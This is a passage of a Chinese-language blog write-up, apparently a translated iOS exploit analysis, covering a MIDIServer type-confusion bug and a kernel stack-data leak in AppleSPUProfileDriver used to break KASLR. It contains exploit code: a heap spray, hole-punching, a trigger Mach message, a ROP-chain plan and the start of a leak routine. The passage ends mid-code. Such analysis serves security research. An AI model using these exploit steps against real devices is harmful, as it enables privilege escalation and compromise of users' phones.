<p>但是，第二种没有。这意味着，通过不同类型对象的 ID，可以在其中一个<code>ClientProcess</code>调用中导致类型混淆，而该方法需要<code>ClientProcess*</code>类型的对象。</p>
<p>查看<code>EmptiedReadBuffer</code>的调用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">; __int64 MIDIIOThread::Run(MIDIIOThread *this)</span><br><span class="line">__ZN12MIDIIOThread3RunEv</span><br><span class="line">[...]</span><br><span class="line">BL              __ZN13ClientProcess17EmptiedReadBufferEv ; ClientProcess::EmptiedReadBuffer(x0) // `x0` is potentially type confused</span><br><span class="line"></span><br><span class="line">; __int64 ClientProcess::EmptiedReadBuffer(ClientProcess *this)</span><br><span class="line">__ZN13ClientProcess17EmptiedReadBufferEv</span><br><span class="line">                STP             X20, X19, [SP,#-0x10+var_10]!</span><br><span class="line">                STP             X29, X30, [SP,#0x10+var_s0]</span><br><span class="line">                ADD             X29, SP, #0x10</span><br><span class="line">                MOV             X19, X0</span><br><span class="line">                ADD             X0, X0, #0x20 ; this</span><br><span class="line">                BL              __ZN22MIDIIORingBufferWriter19EmptySecondaryQueueEv ; MIDIIORingBufferWriter::EmptySecondaryQueue(x0)</span><br><span class="line"></span><br><span class="line">; bool MIDIIORingBufferWriter::EmptySecondaryQueue(MIDIIORingBufferWriter *this)</span><br><span class="line">__ZN22MIDIIORingBufferWriter19EmptySecondaryQueueEv</span><br><span class="line"></span><br><span class="line">                STP             X28, X27, [SP,#-0x10+var_50]!</span><br><span class="line">                STP             X26, X25, [SP,#0x50+var_40]</span><br><span class="line">                STP             X24, X23, [SP,#0x50+var_30]</span><br><span class="line">                STP             X22, X21, [SP,#0x50+var_20]</span><br><span class="line">                STP             X20, X19, [SP,#0x50+var_10]</span><br><span class="line">                STP             X29, X30, [SP,#0x50+var_s0]</span><br><span class="line">                ADD             X29, SP, #0x50</span><br><span class="line">                MOV             X21, X0</span><br><span class="line">                MOV             X19, X0 ; x19 = (MIDIIORingBufferWritter *)this</span><br><span class="line">                LDR             X8, [X19,#0x58]!</span><br><span class="line">                LDR             X8, [X8,#0x10]</span><br><span class="line">                MOV             X0, X19</span><br></pre></td></tr></table></figure>

<p>如上所见，<code>EmptiedReadBuffer</code>代码将立即解除类型混淆对象中的两个指针的引用，并将其转移到一个可以被攻击者控制的地址，这个调用看起来是这样：<code>obj→0x78→0x10(obj→0x20)</code>。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>为了利用这个漏洞，我们可以将<code>ClientProcess</code>类型与<code>MIDIEntity</code>实例混淆。<code>MIDIEntity</code>的大小为<code>0x78</code>，这表示着对象执行的第一次取消引用将超出内存范围。然后，可以在<code>MIDIEntity</code>对象之后对一些受控制的数据进行对齐，因为我们处于用户态，所以有更好的方法。</p>
<p><code>MIDIObjectSetDataProperty</code> API调用将把<code>CoreFoundation</code>对象反序列化到<code>MIDIServer</code>的堆中，因此使用这个调用可以喷射大小为<code>0x90</code>的<code>CFData</code>对象。然后利用此漏洞发送两个包含OOL内存描述符的Mach消息，将其映射到静态地址<code>0x29f000000</code>(由于某些原因，需要发送两次该消息，否则将不会立即映射内存，尚不确定原因)，这个内存是一个连续的CoW映射，包含稍后要使用的ROP链，而且重要的是一个位于<code>0x10</code>偏移处的函数指针，将被<code>EmptySecondaryQueue</code>取消引用。</p>
<p>下面的代码将设置<code>CFData</code>对象被加入<code>MIDIServer</code>的堆中：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Prepare_bunch_keys(); <span class="comment">// For iterating</span></span><br><span class="line">  size_t spraybufsize = <span class="number">0x90</span>;</span><br><span class="line">  <span class="type">void</span> *spraybuf = malloc(spraybufsize);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;spraybufsize; i+=<span class="number">0x8</span>)&#123;</span><br><span class="line">      *(uint64_t*)(spraybuf + i) = SPRAY_ADDRESS; <span class="comment">// The 0x29f000000 address</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="built_in">CFDataRef</span> spraydata = <span class="built_in">CFDataCreate</span>(kCFAllocatorDefault, spraybuf, spraybufsize);</span><br></pre></td></tr></table></figure>

<p>堆的构造：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// OSStatus MIDIClientCreate(CFStringRef name, MIDINotifyProc notifyProc, void *notifyRefCon, MIDIClientRef *outClient);</span></span><br><span class="line">uint32_t mclient_id = <span class="number">0</span>;</span><br><span class="line">MIDIClientCreate(<span class="built_in">CFSTR</span>(<span class="string">&quot;&quot;</span>), useless_notify, <span class="literal">NULL</span>, &amp;mclient_id);</span><br><span class="line">printf(<span class="string">&quot;MIDI Client ID: 0x%xn&quot;</span>, mclient_id);</span><br><span class="line"></span><br><span class="line"><span class="comment">// OSStatus MIDIExternalDeviceCreate(CFStringRef name, CFStringRef manufacturer, CFStringRef model, MIDIDeviceRef *outDevice);</span></span><br><span class="line">uint32_t mdevice_id = <span class="number">0</span>;</span><br><span class="line">MIDIExternalDeviceCreate(<span class="built_in">CFSTR</span>(<span class="string">&quot;&quot;</span>), <span class="built_in">CFSTR</span>(<span class="string">&quot;&quot;</span>), <span class="built_in">CFSTR</span>(<span class="string">&quot;&quot;</span>), &amp;mdevice_id);</span><br><span class="line">printf(<span class="string">&quot;MIDI Device ID: 0x%xn&quot;</span>, mdevice_id);</span><br><span class="line"></span><br><span class="line"><span class="comment">// OSStatus MIDIObjectSetDataProperty(MIDIObjectRef obj, CFStringRef propertyID, CFDataRef data);</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">300</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    MIDIObjectSetDataProperty(mdevice_id, bunchkeys[i], spraydata); <span class="comment">// Each call will unserialize one CFData object of size 0x90 </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sends 1 OOL descriptor each with the spray memory mapping </span></span><br><span class="line">Send_spray_mem();</span><br><span class="line">Send_spray_mem();</span><br><span class="line"></span><br><span class="line"><span class="comment">// OSStatus MIDIObjectRemoveProperty(MIDIObjectRef obj, CFStringRef propertyID);</span></span><br><span class="line"><span class="comment">// Removes every other property we just added</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">300</span>; i = i + <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">    MIDIObjectRemoveProperty(mdevice_id, bunchkeys[i]); <span class="comment">// Free&#x27;s the CFData object, popping holes on the heap </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们现在分配了<code>150</code>个<code>CFData</code>和<code>150</code>个大小为<code>0x90</code>的空闲空间，全部包含<code>SPRAY_ADDRESS</code>指针。下一步是使用<code>MIDIEntity</code>对象填充其中一个漏洞：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uint32_t mentity_id = <span class="number">0</span>;</span><br><span class="line">MIDIDeviceAddEntity(mdevice_id, <span class="built_in">CFSTR</span>(<span class="string">&quot;&quot;</span>), <span class="literal">false</span>, <span class="number">0</span>, <span class="number">0</span>, &amp;mentity_id);</span><br><span class="line">printf(<span class="string">&quot;mentity_id = 0x%xn&quot;</span>, mentity_id);</span><br></pre></td></tr></table></figure>

<p>如果一切按计划进行，那么现在应该在堆上有一块内存，其中第一个<code>0x78</code>字节用有效的<code>MIDIEntity</code>对象填充，剩下的<code>0x18</code>字节用<code>SPRAY_ADDRESS</code>指针填充。</p>
<p>为了触发这个漏洞，我们可以使用<code>MIDIEntity</code>对象<code>ID(mentity_id)</code><a target="_blank" rel="noopener" href="http://调用com.apple.midiserver.io/">调用<code>com.apple.midiserver.io</code></a> Mach服务：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Sends msgh_id 0 with cmd 2 and datalen 4 (ClientProcess::EmptiedReadBuffer)</span></span><br><span class="line">Init_triggerExp_msg(mentity_id);</span><br><span class="line">Send_triggerExp_msg();</span><br></pre></td></tr></table></figure>

<p>它将启动<code>MIDIServer</code>进程中Mach服务线程上的ROP链。</p>
<p>然后根据新对象的ID判断是否触发漏洞：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// OSStatus MIDIExternalDeviceCreate(CFStringRef name, CFStringRef manufacturer, CFStringRef model, MIDIDeviceRef *outDevice);</span></span><br><span class="line">uint32_t verifysucc_mdevice_id = <span class="number">0</span>;</span><br><span class="line">MIDIExternalDeviceCreate(<span class="built_in">CFSTR</span>(<span class="string">&quot;&quot;</span>), <span class="built_in">CFSTR</span>(<span class="string">&quot;&quot;</span>), <span class="built_in">CFSTR</span>(<span class="string">&quot;&quot;</span>), &amp;verifysucc_mdevice_id);</span><br><span class="line">printf(<span class="string">&quot;verify_mdevice_id: 0x%xn&quot;</span>, verifysucc_mdevice_id);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (verifysucc_mdevice_id == mdevice_id + <span class="number">2</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// We failed, reattempting...</span></span><br><span class="line">printf(<span class="string">&quot;Try againn&quot;</span>);</span><br><span class="line">MIDIRestart();</span><br></pre></td></tr></table></figure>

<p>如果对象不连续，则表示利用失败(守护进程崩溃)，因此可以通过<code>MIDIRestart</code>调用重新启动守护进程，然后可以重新尝试利用漏洞。</p>
<p>这里ROP链的基本思路是在<code>SPRAY_ADDRESS</code>内存映射中的缓冲区上调用<code>objc_release</code>，在这个地址上伪造一个假的<code>Objective-C</code>对象，在这个对象上执行release方法。然后创建一个原始的调用链，目的是打开3个<code>userclients</code>，并挂在<code>mach_msg_receive</code>调用中，以便稍后在收到消息时通过<code>vm_read_overwrite</code>覆盖一些内存，这将在稍后的内核利用中使用。</p>
<p>需要注意的是，对于这种基于ROP的利用方法，A12和更新的处理器需要绕过PAC。</p>
<p>从<code>MIDIServer</code>获取的<code>userclients</code>是<code>AppleSPUProfileDriver</code>、<code>IOSurfaceRoot</code>和<code>AppleAVE2Driver</code>。</p>
<h3 id="使用AppleSPUProfileDriver-攻破内核ASLR"><a href="#使用AppleSPUProfileDriver-攻破内核ASLR" class="headerlink" title="使用AppleSPUProfileDriver:攻破内核ASLR"></a>使用AppleSPUProfileDriver:攻破内核ASLR</h3><p>通过<code>MIDIServer</code>我们可以访问<code>AppleSPUProfileDriver</code> <code>userclient</code>，这个<code>userclient</code>实现了12个方法，但是我们只对<code>AppleSPUProfileDriverUserClient::extSignalBreak</code>感兴趣。查看伪代码：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">__int64 AppleSPUProfileDriver::signalBreakGated(AppleSPUProfileDriver *<span class="variable language_">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 dataQueueLock; <span class="comment">// x19</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// x0</span></span><br><span class="line">  __int64 result; <span class="comment">// x0</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [xsp+8h] [xbp-48h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [xsp+Ch] [xbp-44h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [xsp+10h] [xbp-40h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [xsp+38h] [xbp-18h]</span></span><br><span class="line"></span><br><span class="line">  dataQueueLock = <span class="variable language_">this</span>-&gt;dataQueueLock;</span><br><span class="line">  IORecursiveLockLock(<span class="variable language_">this</span>-&gt;dataQueueLock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="variable language_">this</span>-&gt;dataQueue )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    abs_time = mach_absolute_time();</span><br><span class="line">    v12 = AppleSPUProfileDriver::absolutetime_to_sputime(<span class="variable language_">this</span>, abs_time);</span><br><span class="line">    v11 = OSIncrementAtomic(&amp;<span class="variable language_">this</span>-&gt;atomicCount);</span><br><span class="line">    (*(*<span class="variable language_">this</span>-&gt;dataQueue + <span class="number">0x88</span>âˆ‚LL))();           <span class="comment">// IOSharedDataQueue::enqueue(&amp;v10, 0x30)</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  result = IORecursiveLockUnlock(dataQueueLock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数通过一个锁，将一些数据写入堆栈上存储的缓冲区，并调用<code>IOSharedDataQueue::enqueue</code>将该数据提交到对立，缓冲区大小为<code>0x30</code>。这里访问堆栈的方式不是很清楚，所以看一下汇编代码：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">; __int64 AppleSPUProfileDriver::signalBreakGated(AppleSPUProfileDriver *<span class="variable language_">this</span>)</span><br><span class="line">__ZN21AppleSPUProfileDriver16signalBreakGatedEv</span><br><span class="line"></span><br><span class="line">var_48          = <span class="number">-0x48</span></span><br><span class="line">var_44          = <span class="number">-0x44</span></span><br><span class="line">var_40          = <span class="number">-0x40</span></span><br><span class="line">var_18          = <span class="number">-0x18</span></span><br><span class="line">var_10          = <span class="number">-0x10</span></span><br><span class="line">var_s0          =  <span class="number">0</span></span><br><span class="line"></span><br><span class="line">                PACIBSP</span><br><span class="line">                SUB             SP, SP, #<span class="number">0x60</span></span><br><span class="line">                STP             X20, X19, [SP,#<span class="number">0x50</span>+var_10]</span><br><span class="line">                STP             X29, X30, [SP,#<span class="number">0x50</span>+var_s0]</span><br><span class="line">                ADD             X29, SP, #<span class="number">0x50</span></span><br><span class="line">                MOV             X20, X0</span><br><span class="line">                ADRP            X8, #___stack_chk_guard@PAGE</span><br><span class="line">                NOP</span><br><span class="line">                LDR             X8, [X8,#___stack_chk_guard@PAGEOFF]</span><br><span class="line">                STUR            X8, [X29,#var_18]</span><br><span class="line">                LDR             X19, [X0,#<span class="number">0x30B8</span>]</span><br><span class="line">                MOV             X0, X19</span><br><span class="line">                BL              _IORecursiveLockLock</span><br><span class="line">                LDR             X8, [X20,#<span class="number">0x90</span>]</span><br><span class="line">                CBZ             X8, branch_exit_stub</span><br><span class="line">                STR             WZR, [SP,#<span class="number">0x50</span>+var_48]</span><br><span class="line">                BL              _mach_absolute_time</span><br><span class="line">                MOV             X1, X0  ; <span class="type">unsigned</span> __int64</span><br><span class="line">                MOV             X0, X20 ; <span class="variable language_">this</span></span><br><span class="line">                BL              __ZN21AppleSPUProfileDriver23absolutetime_to_sputimeEy ; AppleSPUProfileDriver::absolutetime_to_sputime(ulong <span class="type">long</span>)</span><br><span class="line">                STR             X0, [SP,#<span class="number">0x50</span>+var_40]</span><br><span class="line">                MOV             W8, #<span class="number">0x30CC</span></span><br><span class="line">                ADD             X0, X20, X8</span><br><span class="line">                BL              _OSIncrementAtomic</span><br><span class="line">                STR             W0, [SP,#<span class="number">0x50</span>+var_44]</span><br><span class="line">                LDR             X0, [X20,#<span class="number">0x90</span>]</span><br><span class="line">                LDR             X8, [X0]</span><br><span class="line">                LDRAA           X9, [X8,#<span class="number">0x90</span>]!</span><br><span class="line">                MOVK            X8, #<span class="number">0x911C</span>,LSL#<span class="number">48</span></span><br><span class="line">                ADD             X1, SP, #<span class="number">0x50</span>+var_48</span><br><span class="line">                MOV             W2, #<span class="number">0x30</span></span><br><span class="line">                BLRAA           X9, X8                        <span class="comment">// Call to IOSharedDataQueue::enqueue</span></span><br><span class="line"></span><br><span class="line">branch_exit_stub                    ; CODE XREF: AppleSPUProfileDriver::signalBreakGated(<span class="type">void</span>)+<span class="number">38</span></span><br><span class="line">                MOV             X0, X19 ; lock</span><br><span class="line">                BL              _IORecursiveLockUnlock</span><br><span class="line">                LDUR            X8, [X29,#var_18]</span><br><span class="line">                ADRP            X9, #___stack_chk_guard@PAGE</span><br><span class="line">                NOP</span><br><span class="line">                LDR             X9, [X9,#___stack_chk_guard@PAGEOFF]</span><br><span class="line">                <span class="built_in">CMP</span>             X9, X8</span><br><span class="line">                B.NE            branch_stack_chk_fail</span><br><span class="line">                MOV             W0, #<span class="number">0</span></span><br><span class="line">                LDP             X29, X30, [SP,#<span class="number">0x50</span>+var_s0]</span><br><span class="line">                LDP             X20, X19, [SP,#<span class="number">0x50</span>+var_10]</span><br><span class="line">                ADD             SP, SP, #<span class="number">0x60</span></span><br><span class="line">                RETAB</span><br><span class="line">; ---------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">branch_stack_chk_fail                    ; CODE XREF: AppleSPUProfileDriver::signalBreakGated(<span class="type">void</span>)+<span class="number">9</span>C</span><br><span class="line">                BL              ___stack_chk_fail</span><br></pre></td></tr></table></figure>

<p>可以看到32位值为0保存在<code>var_48</code>中，<code>OSIncrementAtomic</code>调用的结果保存在<code>var_44</code>中，<code>absolutetime_to_sputime</code>的返回值保存在<code>var_40</code>中，但是，还记得为<code>IOSharedDataQueue::enqueue</code>调用提供了<code>0x30</code>大小吗？这意味着任何为初始化的堆栈数据都将泄漏到<code>dataqueue</code>中，虽然<code>dataqueue</code>可能包含泄漏的数据，如果我们不能访问此数据，那将不会对安全产生任何影响。但是<code>IOSharedDataQueue</code>被签名成完全共享。让我们来看下<code>AppleSPUProfileDriverUserClient::clientMemoryForType</code>：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">__int64 AppleSPUProfileDriverUserClient::clientMemoryForType(AppleSPUProfileDriverUserClient *<span class="variable language_">this</span>, <span class="type">int</span> type, <span class="type">unsigned</span> <span class="type">int</span> *options, IOMemoryDescriptor **memory)</span><br><span class="line">&#123;</span><br><span class="line">  [...]</span><br><span class="line"></span><br><span class="line">  ret = <span class="number">0xE00002C2</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( !type )</span><br><span class="line">  &#123;</span><br><span class="line">    memDesc = AppleSPUProfileDriver::copyBuffer(<span class="variable language_">this</span>-&gt;provider);</span><br><span class="line">    *memory = memDesc;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( memDesc )</span><br><span class="line">      ret = <span class="number">0</span>LL;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      ret = <span class="number">0xE00002D8</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 AppleSPUProfileDriver::copyBuffer(AppleSPUProfileDriver *<span class="variable language_">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  [...]</span><br><span class="line"></span><br><span class="line">  dataQueueLock = <span class="variable language_">this</span>-&gt;dataQueueLock;</span><br><span class="line">  IORecursiveLockLock(<span class="variable language_">this</span>-&gt;dataQueueLock);</span><br><span class="line"></span><br><span class="line">  memDesc = <span class="variable language_">this</span>-&gt;queueMemDesc;</span><br><span class="line">  <span class="keyword">if</span> ( memDesc )</span><br><span class="line">  &#123;</span><br><span class="line">    (*(*memDesc + <span class="number">0x20</span>LL))();                   <span class="comment">// OSObject::retain</span></span><br><span class="line">    buf = <span class="variable language_">this</span>-&gt;queueMemDesc;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    buf = <span class="number">0</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  IORecursiveLockUnlock(dataQueueLock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，通过<code>IOConnectMapMemory64</code>可以将<code>IOShareDataQueue</code>映射到内存描述符中，该描述符包含排队的所有数据，包括泄漏的栈数据，为了确定这个漏洞，我们可以先看一个队列泄漏数据的例子：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">30</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">78</span> <span class="number">00</span> <span class="number">00</span> <span class="number">80</span> </span><br><span class="line">c0 <span class="number">5</span>a <span class="number">0</span>c <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> f0 <span class="number">42</span> <span class="number">00</span> e0 ff ff ff </span><br><span class="line"><span class="number">50</span> b4 d8 <span class="number">3</span>b e0 ff ff ff </span><br><span class="line"><span class="number">80</span> <span class="number">43</span> <span class="number">03</span> <span class="number">11</span> f0 ff ff ff </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>

<p>第一个<code>dword</code>是一个<code>IODataQueueEntry</code>结构的<code>size</code>字段(本例为<code>0x30</code>)，该字段位于队列中每个数据块的前面：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> _IODataQueueEntry&#123;</span><br><span class="line">    <span class="built_in">UInt32</span>  size;</span><br><span class="line">    <span class="built_in">UInt8</span>   data[<span class="number">4</span>];</span><br><span class="line">&#125; IODataQueueEntry;</span><br></pre></td></tr></table></figure>

<p>然后我们第三行中看到<code>OSIncrementAtomic</code>的返回值<code>0x78</code>和<code>absolute_to_sputime</code>的值，数据之后是3个内核指针，它们是从堆栈中泄漏出来的。具体来说，我们对第三个指针<code>0xfffffff011034380</code>感兴趣。根据<code>iPhone 8，iOS 12.4</code>的测试，这个指针总是指向<code>__TEXT</code>段，因此通过计算指针偏移，我们可以推断出内核的偏移。信息泄漏的exploit如下所示：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">uint64_t check_memmap_for_kaslr(io_connect_t ioconn)</span><br><span class="line">&#123;</span><br><span class="line">    kern_return_t ret;</span><br><span class="line">    mach_vm_address_t map_addr = <span class="number">0</span>;</span><br><span class="line">    mach_vm_size_t map_size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    ret = IOConnectMapMemory64(ioconn, <span class="number">0</span>, mach_task_self(), &amp;map_addr, &amp;map_size, kIOMapAnywhere);</span><br><span class="line">    <span class="keyword">if</span> (ret != KERN_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(<span class="string">&quot;IOConnectMapMemory64 failed: %x %sn&quot;</span>, ret, mach_error_string(ret));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint32_t search_val = <span class="number">0xfffffff0</span>; <span class="comment">// Constant value of Kernel code segment higher 32bit addr</span></span><br><span class="line">    uint64_t start_addr = map_addr;</span><br><span class="line">    